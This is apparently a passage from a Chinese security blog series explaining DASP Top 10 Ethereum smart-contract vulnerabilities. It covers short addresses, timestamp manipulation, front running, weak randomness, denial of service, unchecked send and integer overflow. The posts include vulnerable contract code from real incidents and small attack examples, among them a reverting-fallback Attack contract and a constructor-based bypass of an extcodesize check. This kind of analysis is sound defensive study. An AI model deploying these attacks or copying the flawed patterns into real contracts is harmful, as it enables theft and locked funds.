    <content type="text"><![CDATA[0x00 Info短地址攻击是DASP TOP10中详细描述的最后一类漏洞。这个漏洞其实可以归结于过去EVM的缺陷。 0x01 基础知识 The Contract Application Binary Interface (ABI) is the standard way to interact with contracts in the Ethereum ecosystem, both from outside the blockchain and for contract-to-contract interaction. 在EVM虚拟机中合约是通过ABI接口进行交互，数据和方法都根据特定标准进行编解码。具体参见Contract ABI Specification。 如何通过ABI调用合约方法？方法和数据如何编码？我们举例（经典Token合约）来说明：123456789101112131415161718192021contract MyToken &#123; mapping (address =&gt; uint) balances; event Transfer(address indexed _from, address indexed _to, uint256 _value); function MyToken() &#123; balances[tx.origin] = 10000; &#125; function sendCoin(address to, uint amount) returns(bool sufficient) &#123; if (balances[msg.sender] &lt; amount) return false; balances[msg.sender] -= amount; balances[to] += amount; Transfer(msg.sender, to, amount); return true; &#125; function getBalance(address addr) constant returns(uint) &#123; return balances[addr]; &#125;&#125; 如果我们想转币到其他地址，会外部调用sendCoin()方法，则创建交易后查看input数据如下：展开为： 0x90b98a11 方法签名的hash值，4个字节，通过Keccak(sendCoin(address, uint))计算得到 00000000000000000000000062bec9abe373123b9b635b75608f94eb8644163e ‘to’地址，20个字节，填充前导0（12字节）至32字节 0000000000000000000000000000000000000000000000000000000000000002 ‘amount’数量，1字节无符号整型，填充前导0（31字节）至32字节 input就是一笔完整的交易数据。 0x02 攻击利用17年Golem团队发现一笔可疑的GNT交易，从而发现了短地址漏洞。How to Find $10M Just by Reading the Blockchain一文中详细描述了漏洞的发现和利用。 我们还是以上面的例子分析下漏洞成因。EVM和合约如果未校验用户输入会产生什么效果？我们把’to’地址的32字节最后1字节去掉，变成0x62bec9abe373123b9b635b75608f94eb864416，那此时input数据就会变成：1230x90b98a1100000000000000000000000062bec9abe373123b9b635b75608f94eb8644160000000000000000000000000000000000000000000000000000000000000002 第一个参数不足32字节会从第二参数高位取0补位，这样第二个参数就被左移1字节，相当于amount * 256。 交易瞬间变成了:123 from: &apos;0x8b349f26a49a45776a1ec0d0188e7a89367c8c5d&apos;, to: &apos;0x62bec9abe373123b9b635b75608f94eb86441600&apos;,value: 512, 该漏洞能够成功利用的大前提是：1、币充足；2、在构成input数据时用户的输入和填充没有进行校验（在remix中实验失败就是因为已经不允许传入非法短地址了）]]></content>
      <categories>
        <category>区块链</category>
      </categories>
      <tags>
        <tag>BlockChain</tag>
        <tag>DASP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[#DASP# Time Manipulation (8)]]></title>
    <url>%2F2018%2F08%2F19%2FDASP-Time-Manipulation-8%2F</url>
    <content type="text"><![CDATA[0x00 Info如果攻击者拥有矿工角色，在交易打包成块时，矿工在一定范围是可以操作块的时间戳的，而恰恰合约利用时间戳生成逻辑（特别是涉及到资金交易）就会存在Time manipulation风险。 0x01 Rules一个合约需要用到“当前时间”，通常是通过block.timestamp或者now来实现，而这个值来源于矿工！矿工是可以在几秒内调整这个时间戳的，从而为自己的利益改变合同的输出。 例如一个合约使用时间戳来生成随机数（在example中有实例），矿工可以在区块被验证后30s内发布时间戳，从而利用这30s的时间增加自己获利概率。 30-second Rule 矿工可以改变区块的时间戳 仅限于被验证后的30s 当前块的时间戳不能小于前一块的时间戳 但是一个合约具备以下特性，是可以安全使用时间戳的： If the smart contract function can tolerate a 30-second time period, it’s safe to use timestamp; If the scale of a time-dependent event can vary by 30 seconds and maintain integrity, it’s also safe to use a block timestamp. 0x02 Examples前两个实例合约主要利用block.timestamp来生成随机数，而在#DASP# Bad Randomness一文中我们详细介绍了这种随机数生成的缺陷。 theRunSource Code 1234567891011uint256 constant private salt = block.timestamp;function random(uint Max) constant private returns (uint256 result)&#123; //get the best seed for randomness uint256 x = salt * 100/Max; uint256 y = salt * block.number/(salt % 5) ; uint256 seed = block.number/3 + (salt % 300) + Last_Payout + y; uint256 h = uint256(block.blockhash(seed)); return uint256((h / x)) % Max + 1; //random number between 1 and Max&#125; theRun合约使用block.timestamp作为随机数种子，而矿工完全可以在30s内计算一个利于获胜的随机数。 EtherLottoSource Code 12// Compute some *almost random* value for selecting winner from current transaction.var random = uint(sha3(block.timestamp)) % 2; EtherLotto合约随机数的计算就更简单粗暴了，直接使用block.timestamp做hash。 GovernmentalSource Code 在#DASP# Denial of Services开篇中我们介绍过Governmental合约，其存在重置超长creditor列表时gas溢出导致的DOS问题（未检查send返回值）。 如果攻击者同时拥有矿工身份，那该合约同样存在时间戳篡改风险。游戏的规则玩法我们再简单介绍下，政府在最近12小时内没有收到任何投资人捐赠，则将奖金发给最后一名投资人。 恶意的矿工用修改后的时间戳为他的交易生成了一个块，从而延迟了他的交易成为最后的交易，这样他就从合约中赢得了资金。 在A survey of attacks on Ethereum smart contracts一文中介绍了Governmental合约的三个攻击方式。]]></content>
      <categories>
        <category>区块链</category>
      </categories>
      <tags>
        <tag>BlockChain</tag>
        <tag>DASP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[#DASP# Front Running (7)]]></title>
    <url>%2F2018%2F08%2F16%2FDASP-Front-Running-7%2F</url>
    <content type="text"><![CDATA[0x00 Info本篇介绍DASP第七种漏洞类型–前置执行。可以理解为因为区块链是公开，其他用户或者合约的交易信息均透明可查，恶意用户可以利用这些已知信息制造有利于自己的交易，并通过提高手续费的方式抢先执行获利。 当然，在front-running-griefing-and-the-perils-of-virtual-settlement中描述，如果这个恶意用户本身又是矿工，可以任意安排交易并审查其他人交易，使自己利益最大化。 0x01 实例LastIsMeContract Source Code LastIsMe是一个lottery游戏合约，在一个游戏回合（一定的区块数内）参与者购买一张票认领最后一个座位，回合结束时最后一个就坐的玩家会获得头奖。 攻击者可以在回合快结束时观察其他玩家的交易池，通过提高gas来挤掉其他玩家的交易从而获得奖金。 ICOContract Source Code ICO本身是一道CTF题，它包含一个DAPP网站和与其交互的两个合约（HaCoin &amp; ICO），部署在rinkeby测试链上。 HaCoin是一个Token合约，比赛的目标也是从该合约中获取超过31337枚HackCoin，而这个合约本身并没有问题，需要配合Web网站存在的XSS漏洞来提权，才能进行转币操作。很有意思，具体writeup参见ZeroNights ICO Hacking Contest Writeup。 而另一个合约ICO是一个lottery合约，游戏规则也很简单，5个块为一回合，回合内参与者猜一个数字，回合结束时机器人会随机抛出一个数字，如果谁猜中谁就获胜。而该合约存在前置执行漏洞。 1234567891011121314151617181920function spinLottery(uint number) public &#123; if (msg.sender != robotAddress) &#123; playerNumber[msg.sender] = number; players.push(msg.sender); NewLotteryBet(msg.sender); &#125; else &#123; require(block.number - lotteryBlock &gt; 5); lotteryBlock = block.number; for (uint i = 0; i &lt; players.length; i++) &#123; if (playerNumber[players[i]] == number) &#123; desires[players[i]].active = true; desires[players[i]].email = "*Use changeEmail func to set your email.*"; Proposal(players[i], desires[players[i]].email); &#125; &#125; delete players; // flushing round NewLotteryRound(lotteryBlock); &#125;&#125; 机器人发布的随机数明文提交到交易池，如果攻击者能够足够快的检索pending交易并找到该随机数，然后使用该随机数参与游戏，保证两笔交易在同一个块中，并提高gas在机器人发布随机数的交易之前执行，就能获胜。 BancorFormulaContract Source Code 详细分析：Implementing Ethereum trading front-runs on the Bancor exchange in Python]]></content>
      <categories>
        <category>区块链</category>
      </categories>
      <tags>
        <tag>BlockChain</tag>
        <tag>DASP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[#DASP# Bad Randomness (6)]]></title>
    <url>%2F2018%2F08%2F09%2FDASP-Bad-Randomness-6%2F</url>
    <content type="text"><![CDATA[0x00 Info绝对的随机在Ethereum中很难实现，因为所有参数都可以在透明的链上查询，因此想要利用随机特性生成逻辑很容易出现bug，本篇就介绍DASP中第六类漏洞–不安全的随机性。 0x01 错误实践Solidity本身提供一些获取“随机值”的方法和变量，你可以在官方文档中查看。但是这些“随机值”（在链上公开）如果不当的作为生成随机数的因子或种子，那随机数就可以被预测。 根据DASP提供的实例我们看看有哪些坑。 第一种12345678910uint256 private seed;function play() public payable &#123; require(msg.value &gt;= 1 ether); iteration++; uint randomNumber = uint(keccak256(seed + iteration)); if (randomNumber % 2 == 0) &#123; msg.sender.transfer(this.balance); &#125;&#125; 利用私有变量seed和iteration通过keccak256 hash计算得到随机数，虽然seed属性为private，但是它也要在某个时间点设置，可以通过链上相关tx来获取其值，因此随机性可预测。 第二种123456function play() public payable &#123; require(msg.value &gt;= 1 ether); if (block.blockhash(blockNumber) % 2 == 0) &#123; msg.sender.transfer(this.balance); &#125;&#125; 这里使用block.blockhash(blockNumber)来计算随机数，这里必须强调的是，在solidity中，block.blockhash(uint blockNumber) returns (bytes32)只计算就近的256个块hash，如果blockNumber为当前块（block.number）或者超过256更久远的块，计算结果都是0. block.blockhash(uint blockNumber) returns (bytes32): hash of the given block - only works for 256 most recent blocks excluding current The block hashes are not available for all blocks for scalability reasons. You can only access the hashes of the most recent 256 blocks, all other values will be zero. 同时Solidity文档也强调尽量不要使用block.timestamp、now和block.blockhash计算随机数。 Do not rely on block.timestamp, now and block.blockhash as a source of randomness, unless you know what you are doing. Both the timestamp and the block hash can be influenced by miners to some degree. Bad actors in the mining community can for example run a casino payout function on a chosen hash and just retry a different hash if they did not receive any money. block.timestamp (uint): current block timestamp as seconds since unix epoch now (uint): current block timestamp (alias for block.timestamp) block.blockhash(uint blockNumber) returns (bytes32): hash of the given block - only works for 256 most recent blocks excluding current 0x02 案例我们先来看两个DASP提供的真实案例。 SmartBillions披露：SmartBillions lottery contract just got hacked! SmartBillions是一个赌博合约（Contract Source Code），本身是一个ICO项目。玩法是下注6位数，每位范围0-15，猜中2位以上会获得相应奖励。根据论坛作者supr3m的披露，该合约本身存在随机数漏洞，黑客利用触发2次漏洞取走合约中400ETH，在后续要利用漏洞全部取走资金时，ICO利用后门函数冻结资金防止资金被盗。这个后门函数也被作者吐槽，怀疑ICO会利用后门集资卷款跑路。 我们先看下黑客利用合约漏洞做的tx 合约执行标签可以看到两笔200ETH的操作 在4337369块，合约0x5ace17f87c7391e5792a7683069a8025b83bbd85向0x6245c1804F7fCEB305A60BBb5cb6E18F939EDB69账户地址转200ETH，我们看下该地址的TX 黑客首先在4337096块调用合约playSystem(uint _hash, address _partner)函数，第一个参数000001为下注的6位数 然后再超过256块后的4337369块调用合约won()函数，赢得200ETH的二等奖金（猜中前5个下注数） 在第二步的蓝框中黑客还想继续利用同样手法赢得一等奖金（6个下注数全中） 根据论坛作者描述和黑客操作，审计合约后，发现漏洞是在playSystem()中的won()函数中，根据player.blockNum的hash和下注的数字做比对，而这种hash在超过256个块后结果为0，因此黑客押的000001和hash结果000000前5位一致而得到二等奖。 theRun#timestamp dependence bugContract Source Code 合约中利用random(unit Max)函数进行随机数生成，而生成因子主要是利用block.timestamp和block.number，而时间戳可以由矿工操控，故矿工可以选择有利的随机数来提高获取奖励的概率。123456789101112131415161718192021222324252627function Participate(uint deposit) private &#123; ... // Winning the Pot :) Condition : paying at least 1 people with deposit &gt; 2 ether and having luck ! if( ( deposit &gt; 1 ether ) &amp;&amp; (deposit &gt; players[Payout_id].payout) )&#123; uint roll = random(100); //take a random number between 1 &amp; 100 if( roll % 10 == 0 )&#123; //if lucky : Chances : 1 out of 10 ! msg.sender.send(WinningPot); // Bravo ! WinningPot=0; &#125; &#125; ...&#125;uint256 constant private salt = block.timestamp;function random(uint Max) constant private returns (uint256 result)&#123; //get the best seed for randomness uint256 x = salt * 100 / Max; uint256 y = salt * block.number / (salt % 5) ; uint256 seed = block.number/3 + (salt % 300) + Last_Payout +y; uint256 h = uint256(block.blockhash(seed)); return uint256((h / x)) % Max + 1; //random number between 1 and Max&#125; 接着我们研究下受随机数漏洞影响的当下最火游戏合约Fomo3D。 Fomo3D 这是一个叫JUST的团队开发的以太坊游戏，just在英文中有“公正、正义”的意思，然而游戏从UI界面到游戏说明充满了恶搞和对人性贪婪的讽刺，比如推荐链接在游戏中就叫“坏建议”，开发团队并不避讳这是一个乐透game，声称这是一次大型社会学实验。 这个游戏本身就是一个庞氏骗局，各位看官三思而后入！ 游戏官网游戏玩法介绍FoMo3Dlong Source Code 而漏洞发现的起因也非常有趣，Fomo3D游戏的开发者在twitter上@V神，说发现一个EVM上核弹级漏洞，结果被Ethereum团队leader回怼，并且顺手找了一个Fomo3D游戏漏洞^_^故事经过在文章Pwning Fomo3D Revealed: Iterative, Pre-Calculated Contract Creation For Airdrop Prizes!中有介绍，并且描述了Fomo3D漏洞。 根据文章描述Fomo3D存在两个漏洞导致被薅羊毛。 第一个漏洞–错误的访问控制检查：12345678modifier isHuman() &#123; address _addr = msg.sender; uint256 _codeLength; assembly &#123;_codeLength := extcodesize(_addr)&#125; require(_codeLength == 0, "sorry humans only"); _;&#125; FoMo3Dlong合约使用isHuman()函数判断调用者是一个外部账户还是一个合约地址，核心利用assembly {_codeLength := extcodesize(_addr)}判断，其中关键函数extcodesize(a)代表a地址上的代码大小，如果等于0，则代表一个外部账户，非0则代表合约地址，本身很好理解。但这样判断有个风险，在Mechanism Design Security in Smart Contracts一文中提到： NOTE: Do not use the EXTCODESIZE check to prevent smart contracts from calling a function. This is not foolproof, it can be subverted by a constructor call, due to the fact that while the constructor is running, EXTCODESIZE for that address returns 0. 例：合约A中有函数funA使用如上的访问控制，当你在一个合约B的构造函数（constructor()）中调用合约A中的funA，可绕过访问控制成功调用，尽管B是一个合约。extcodesize(B_addr) return 0. 我们可以通过remix验证这一点：合约A，主要功能是判断调用者是外部账户(返回false)还是合约账户(返回true)：12345678910contract A &#123; function isContract() public returns (bool isContract)&#123; uint32 size; address _addr = msg.sender; assembly &#123; size := extcodesize(_addr) &#125; return (size &gt; 0); &#125;&#125; 发布合约A并将合约A地址写入合约B，合约B分别在构造函数内外去调用合约A的isContract()函数，通过log查看返回值：1234567891011121314151617interface demoInterface &#123; function isContract() external returns (bool);&#125;contract B &#123; event LogConstructor(bool); event Logb(bool); constructor() public &#123; demoInterface demo= demoInterface(0xdc544654fefd1a458eb24064a6c958b14e579154); emit LogConstructor(demo.isContract()); &#125; function b() public &#123; demoInterface demo= demoInterface(0xdc544654fefd1a458eb24064a6c958b14e579154); emit Logb(demo.isContract()); &#125;&#125; 发布合约B并且调用方法b，对比下log中打印的返回值可以看到在构造函数中调用其他合约受控（extcodesize()）的方法可以绕过访问控制。 第二个漏洞–可预测的随机数：Fomo3D中你在花钱买key的时候会有一定几率获得空投。1234567891011121314151617181920function airdrop() private view returns(bool)&#123; uint256 seed = uint256(keccak256(abi.encodePacked( (block.timestamp).add (block.difficulty).add ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)).add (block.gaslimit).add ((uint256(keccak256(abi.encodePacked(msg.sender)))) / (now)).add (block.number) ))); if((seed - ((seed / 1000) * 1000)) &lt; airDropTracker_) return(true); else return(false);&#125; 可以看到随机数种子seed的计算是由当前块的信息加上msg.sender构成，而攻击者可以在合适的时间计算得到小于airDropTracker_的seed，从而保证100%获取空投奖励。 文章描述攻击步骤可以总结为： 1. Pre-calculate the address X of the next contract that the attacker address is about to create; 2. If X can’t be used to generate a good seed with the current airDropTracker_, goto step 1; 3. Create contract at address X; 4. Invoke buyXid() function from X to win the airdrop prize; 5. Invoke withdraw() function from X to get earnings calculated by the airdrop prize; 这里还有个知识点是如何计算以太坊合约地址，读者可以去主动学习。 How to PWN FoMo3D, a beginners guide 同样提供了漏洞分析及exp利用。 0x03 最佳实践在Predicting Random Numbers in Ethereum Smart Contracts一文中，调研3k+合约发现43个合约存在随机数可被预测的问题，其主要由4类漏洞产生： PRNGs using block variables as a source of entropy PRNGs based on a blockhash of some past block PRNGs based on a blockhash of a past block combined with a seed deemed private PRNGs prone to front-running（后续文章会讲到） 同时也描述了如何实现更安全随机数的3中方法： External oracles Signidice Commit–reveal approach]]></content>
      <categories>
        <category>区块链</category>
      </categories>
      <tags>
        <tag>BlockChain</tag>
        <tag>DASP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[#DASP# Denial of Services (5)]]></title>
    <url>%2F2018%2F08%2F09%2FDASP-Denial-of-Services-6%2F</url>
    <content type="text"><![CDATA[0x00 Info在智能合约中，当 超过gas限制，异常抛出，非预期的终止合约，访问控制被破坏 均会产生合约拒绝服务问题。本篇就介绍DASP第五大漏洞–Denial of Service 0x01 Real World ImpactGovernMental起因：GovernMental’s 1100 ETH jackpot payout is stuck because it uses too much gas官网：GovernMental源码：etherscan code GovernMental本身是个嘲讽政府庞氏骗局的游戏合约，其规则大概为投资者捐最少1ETH给政府，如果政府在最近12小时内没有收到任何捐赠，则将奖金发给最后一名投资人，而如果收到奖励，则按一定比例分别将钱分给资金池、政府及投资人。 其中在大于12小时未收到赞助的逻辑分支中，将奖金分给最后一名投资人后会重置所有投资人：123456789101112131415if (lastTimeOfNewCredit + TWELVE_HOURS &lt; block.timestamp) &#123; // Return money to sender msg.sender.send(amount); // Sends all contract money to the last creditor creditorAddresses[creditorAddresses.length - 1].send(profitFromCrash); corruptElite.send(this.balance); // Reset contract state lastCreditorPayedOut = 0; lastTimeOfNewCredit = block.timestamp; profitFromCrash = 0; creditorAddresses = new address[](0); // out of gas! creditorAmounts = new uint[](0); // out of gas! round += 1; return false;&#125; 以上标注out of gas的两行在底层运行时，代码会循环遍历存储位置并逐个删除，如果creditors过多的话，会消耗大于当前最大gas数量导致合约失效。 Governmental Attack：简化版的Governmental及其EXP利用。 Parity kill()Parity Multisig Hacked. AgainA Postmortem on the Parity Multi-Sig Library Self-Destruct 这个其实在#DASP# Access Control (3)一篇中已经介绍，还是利用访问控制漏洞接管parity钱包，然后不是取钱还是调用合约中kill函数销毁合约，从而导致任意用户都无法继续使用。1234// kills the contract sending everything to `_to`.function kill(address _to) onlymanyowners(sha3(msg.data)) external &#123; suicide(_to);&#125; 0x02 Example实例来源于DASP，模仿King of the Ether游戏规则，当你向合约发送比现在price多的eth时，你就可以成为总统，之前的总统会收到当前price的补偿，且当前price翻倍。而争夺者为一个合约且在fallback函数中恶意抛出异常，则可以破坏游戏规则永远成为总统。 12345678910111213141516171819202122232425contract PresidentOfCountry &#123; address public president; uint256 public price; function PresidentOfCountry(uint256 _price) &#123; require(_price &gt; 0); price = _price; president = msg.sender; &#125; function becomePresident() payable &#123; require(msg.value &gt; price); // must pay the price to become president president.transfer(price); // we pay the previous president president = msg.sender; // we crown the new president price = price * 2; // we double the price to become president &#125;&#125;contract Attack &#123; function () &#123; revert(); &#125; function Attack(address _target) payable &#123; _target.call.value(msg.value)(bytes4(keccak256("becomePresident()"))); &#125;&#125; Attack合约部署后通过构造函数调用PresidentOfCountry合约的becomePresident()函数，同时发送大于price的eth，则执行becomePresident逻辑，1. 向之前的账户发送price补偿；2. 自己合约账户变为president；3. price翻倍。当其他正常账户参与游戏调用becomePresident逻辑时，同样会向attach合约地址（当前president）发送price，正因为当前president不是普通账户还是合约账户，transfer会触发合约中fallback函数，而恶业攻击者在fallback中执行了revert()，导致异常，从而无法执行后续变更总统和价格的逻辑。造成合约DOS。 可以再remix中模拟上述操作。 0x03 Others除了智能合约，链核心、链节点、区块链相关的网址都会出现DOS。 EOSIO EOSIO CVE-2018-11548 Bitcoin Core CVE-2016-10724 CVE-2016-10725 BitCoin Web 知名比特币网站bustabit价值$12,000的点击劫持、XSS以及拒绝服务漏洞详情揭秘]]></content>
      <categories>
        <category>区块链</category>
      </categories>
      <tags>
        <tag>BlockChain</tag>
        <tag>DASP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[#DASP# Unchecked Return Valuse (4)]]></title>
    <url>%2F2018%2F08%2F03%2FDASP-Unchecked-Return-Valuse-5%2F</url>
    <content type="text"><![CDATA[0x00 InfoUnchecked Return Values For Low Level Calls漏洞简单理解就是没有检查一些不安全调用函数的返回值导致。 0x01 CALL -&gt; Contract在reentrancy漏洞介绍中提到几种账户间转币函数，这里我们回顾并深入了解下： 函数 特性 address.transfer() 1. 失败抛出异常且回滚 2. 提供2300gas，防止reentrancy address.send() 1. 失败返回false 2. 提供2300gass，防止reentrancy address.call.value().gas()() 1. 失败返回false 2. 发送所有可用gas 在这些交易函数中需要注意的是： addr.transfer()和addr.send()能够防止重入漏洞。但是这些方法会触发fallback函数执行，被调合约仅被提供2300gas做一些日志事件。 x.transfer(y)等同于require(x.send(y))，transfer在发送失败时会自动revert（内置失败处理）。 addr.call.value(y)()也会触发代码执行，但是会用所有提供的gas执行代码，当然这种方式不能防止reentrancy漏洞。 通过了解以上我们会提出一些疑问： 2300gas由谁来提供？为何是2300gas? 2300gas能做什么？ 哪些行为会导致发送失败？ 要回答这些问题，首先要知道一个知识点，transfer、send、call在EVM虚拟机执行时会将这些solidity编译成 CALL 指令，而在以太坊wiki中定义了CALL的gas消耗： CALL has a multi-part gas cost: 700 base 9000 additional if the value is nonzero 25000 additional if the destination account does not yet exist (note: there is a difference between zero-balance and nonexistent!) CALLCODE operates similarly to call, except without the potential for a 25000 gas surcharge. The child message of a nonzero-value CALL operation (NOT the top-level message arising from a transaction!) gains an additional 2300 gas on top of the gas supplied by the calling account; this stipend can be considered to be paid out of the 9000 mandatory additional fee for nonzero-value calls. This ensures that a call recipient will always have enough gas to log that it received funds. 从wiki中可以知道交易操作至少需要9700gas（700base+9000additional），而2300gas就在其中，由接收合约提供，确保有足够gas记录其接收的资金。2300gas属于硬编码津贴，规定就是这么多。这里即回答了第一个问题。 对于第二个问题哪些行为会导致发送失败，其实在wiki中也有说明。 Execution running out of gas An operation trying to take more slots off the stack than are available on the stack, or put more than 1024 items onto the stack Jumping to a bad jump destination An invalid opcode (note: the code of an account is assumed to be followed by an infinite tail of STOP instructions, so the program counter “walking off” the end of the code is not an invalid opcode exception. However, jumping outside the code is an exception, because STOP is not a valid jump destination) The REVERT opcode at 0xfd (starting from Metropolis; pre-Metropolis 0xfd is simply an invalid opcode) 其中gas溢出和超过调用栈限制这两点导致的发送失败很容易被忽略，但这也恰恰是漏洞发生的地方。 0x02 Unchecked Low Level Calls正如DASP介绍，solidity特性中存在一些不安全的函数call(),callcode()(已经遗弃),delegatecall()和send()。这个函数在运行错误时行为并不可逆，仅会返回false，代码流程也会继续，这就会带来很多不可预期的结果。 实例代码:123456function withdraw(uint256 _amount) public &#123; require(balances[msg.sender] &gt;= _amount); balances[msg.sender] -= _amount; etherLeft -= _amount; msg.sender.send(_amount);&#125; msg.sender为一个智能合约，其中未定义fallback函数，或者callstack已满，均会导致send失败，而函数未检出send返回值，最终导致msg.sender和etherLeft数量减少且状态不可逆转，最后却没有取回减少的钱。 0x03 KotET contractKotET是一个抢皇位的游戏合约，合约代码见github，游戏规则和漏洞分析可以看Post-Mortem Investigation这篇文章。 123456789101112131415 // Claim the throne for the given name by paying the currentClaimFee.function claimThrone(string name) &#123; ... uint compensation = valuePaid - wizardCommission; if (currentMonarch.etherAddress != wizardAddress) &#123; currentMonarch.etherAddress.send(compensation); &#125; else &#123; // When the throne is vacant, the fee accumulates for the wizard. &#125; ...&#125; 其主要就是因为没有判断send函数返回值，导致在接受者是一个合约时，有可能因为gas不足而导致send失败（例如Mist钱包合约对于KotET提供的gas不足以处理支付行为），从而old king没有收到补偿，new king没有消耗资金变争夺了王位。 0x04 lotto contractissuescontract source codeexp 123456789101112function cash(uint roundIndex, uint subpotIndex)&#123; ... var winner = calculateWinner(roundIndex,subpotIndex); var subpot = getSubpot(roundIndex); winner.send(subpot); rounds[roundIndex].isCashed[subpotIndex] = true; //Mark the round as cashed&#125; 这里合约的漏洞比较简单，还是send没有判断返回值，导致在callstack超过1024时send失败，程序继续执行。但是可以学习如何用pyethereum写exp。 amiller所用的pyethereum与现在的版本已有很大区别，需要重新优化exp代码。 0x05 Others其他合约也存在类似问题，例如BTC合约：Report: Security Audit of BTC Relay implementationdiff Scanning Live Ethereum Contracts for the “Unchecked-Send” Bug一文中也详细描述了此类问题的并提供了修复和扫描工具原理–Appendix A: Details on how we analyze the blockchain。 利用sand函数在虚拟机字节码中连续POP数量来判断是否做返回值处理。]]></content>
      <categories>
        <category>区块链</category>
      </categories>
      <tags>
        <tag>BlockChain</tag>
        <tag>DASP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[#DASP# Arithmetic Issues (3)]]></title>
    <url>%2F2018%2F07%2F25%2FDASP-Arithmetic-Issues-4%2F</url>
    <content type="text"><![CDATA[0x00 InfoArithmetic Issues为DASP TOP10的第三类漏洞。这类算数漏洞比较常见 also known as integer overflow and integer underflow 0x01 原理整型溢出的原理很简单，以8位整型为例，借图说明上溢。8位无符号整型范围[0, 255]: 8位有符号整型范围[-128, 127]: 对于下溢 (unit8)0-1=(uint8)255, (int8)(-128)-1=(int8)127. 0x02 场景对于智能合约常见的整型溢出漏洞，会出现在如下场景： 经典场景，没有检查下溢 12345function withdraw(uint _amount) &#123; require(balances[msg.sender] - _amount &gt; 0); // 如果 _amount &gt; msg.sender, underflow msg.sender.transfer(_amount); // 会transfer一个很大的值 balances[msg.sender] -= _amount;&#125; off-by-one 1234function popArrayOfThings() &#123; require(arrayOfThings.length &gt;= 0); arrayOfThings.length--; // length是uint，当length=0，length--会下溢翻转；同样++也需要注意&#125; 关键字varvar会根据分配值更改为最小适配类型，下例中i=0，因此i被分配为uint8。因此i最大255，当somethingLarge&gt;256时，i就会上溢。 123for (var i = 0; i &lt; somethingLarge; i ++) &#123; // ...&#125; 0x03 实例上溢漏洞Hexagon分析：代币变泡沫，以太坊Hexagon溢出漏洞比狗庄还过分Code: Source Code 漏洞函数：1234567891011121314151617181920function _transfer(address _from, address _to, uint _value) internal &#123; /* Prevent transfer to 0x0 address. Use burn() instead */ require (_to != 0x0); /* Check if the sender has enough */ require (balanceOf[_from] &gt;= _value + burnPerTransaction); // Boom! /* Check for overflows */ require (balanceOf[_to] + _value &gt; balanceOf[_to]); /* Subtract from the sender */ balanceOf[_from] -= _value + burnPerTransaction; /* Add the same to the recipient */ balanceOf[_to] += _value; /* Apply transaction fee */ balanceOf[0x0] += burnPerTransaction; /* Update current supply */ currentSupply -= burnPerTransaction; /* Notify network */ Burn(_from, burnPerTransaction); /* Notify network */ Transfer(_from, _to, _value);&#125; 典型的整型上溢漏洞。通过remix可以复现漏洞： SMT分析： Solidity合约中的整数安全问题——SMT/BEC合约整数溢出解析 New proxyOverflow Bug in Multiple ERC20 Smart Contracts (CVE-2018-10376)Code: Source Code 漏洞函数：123456789101112131415161718192021function transferProxy(address _from, address _to, uint256 _value, uint256 _feeSmt, uint8 _v,bytes32 _r, bytes32 _s) public transferAllowed(_from) returns (bool)&#123; if(balances[_from] &lt; _feeSmt + _value) revert(); // Boom! uint256 nonce = nonces[_from]; bytes32 h = keccak256(_from,_to,_value,_feeSmt,nonce); if(_from != ecrecover(h,_v,_r,_s)) revert(); if(balances[_to] + _value &lt; balances[_to] || balances[msg.sender] + _feeSmt &lt; balances[msg.sender]) revert(); balances[_to] += _value; Transfer(_from, _to, _value); balances[msg.sender] += _feeSmt; Transfer(_from, msg.sender, _feeSmt); balances[_from] -= _value + _feeSmt; nonces[_from] = nonce + 1; return true;&#125; 通过remix可以复现漏洞： BEC分析：ALERT: New batchOverflow Bug in Multiple ERC20 Smart Contracts (CVE-2018-10299)Code: Source Code 漏洞函数：12345678910111213function batchTransfer(address[] _receivers, uint256 _value) public whenNotPaused returns (bool) &#123; uint cnt = _receivers.length; uint256 amount = uint256(cnt) * _value; // Boom! require(cnt &gt; 0 &amp;&amp; cnt &lt;= 20); require(_value &gt; 0 &amp;&amp; balances[msg.sender] &gt;= amount); balances[msg.sender] = balances[msg.sender].sub(amount); for (uint i = 0; i &lt; cnt; i++) &#123; balances[_receivers[i]] = balances[_receivers[i]].add(_value); Transfer(msg.sender, _receivers[i], _value); &#125; return true;&#125; 通过remix可以复现漏洞： 下溢漏洞MerdeToken以上的漏洞都很简单，简单分析既能找到Bug，而这个漏洞就很有意思了，一度被怀疑是后门。 分析：MerdeToken: It’s Some Hot ShitCode: Source Code MDT就是一个token contract，你可以通过该合约设置信任第三方及取币额度，还有常规的存币，交易和取币操作。但该合约额外提供了并不需要的奖金代码操作，而此功能存在漏洞，可以任意修改取币额度限制，因此被怀疑是后门。 漏洞其实很简单，bonusCodes.length如果等于0，bonusCodes.length–会造成下溢翻转变为 2**256-1。1234function popBonusCode() onlyOwner &#123; require(bonusCodes.length &gt;= 0); bonusCodes.length--; // Boom!&#125; 漏洞的利用方式很有趣，有点像二进制中的栈溢出和任意内存写，这里着重讲解。 首先你需要理解Solidity中的状态变量存储模型（Layout of State Variables in Storage）。理解模型有几个关键点： 合约的存储由一个256位指针处理，而合约内的变量都存储在以合约指针为基址的偏移地址中。 大小固定的变量（除了mapping，变长数组以外的所有类型）在存储中是依次连续从位置0开始排列在一个个32字节槽中。 如果多个变量占用的大小少于32字节，会尽可能的打包到单个槽位里。 由于mapping和变长数组的大小不可预知，因此定义使用keccak256哈希来计算数据存储位置。 对于mapping，会在mapping定义位置（p）占用一个槽位，但其中无数据，而数据存储位置通过 keccak256(k . p)计算得到，k为mapping键。 对于动态数组，会在数组定义位置（p）占用一个槽位，存储数组元素个数，而数据存储位置通过 keccak256(p)计算得到。 其中第四点比较难理解，我们通过该MerdeToken合约说明。在MerdeToken中定义了如下状态变量：123456address public owner;address public trustedThirdParty;mapping (address =&gt; uint) public balanceOf;uint public deposited;uint public withdrawLimit;uint[] public bonusCodes; 在storage中从位置0依次排列12345678"storage": &#123; 0x00 : (address)owner, 0x01 : (address)trustedThirdParty, 0x02 : (mapping)balanceOf, 0x03 : (uint)deposited, 0x04 : (uint)withdrawLimit, 0x05 : (uint[])bonusCodes&#125; 其中balanceOf为mapping映射，而位置为0x02，因此在0x02位置为空值，而balanceOf中k对应的value在storage中的存储位置计算方式为keccak256(k . 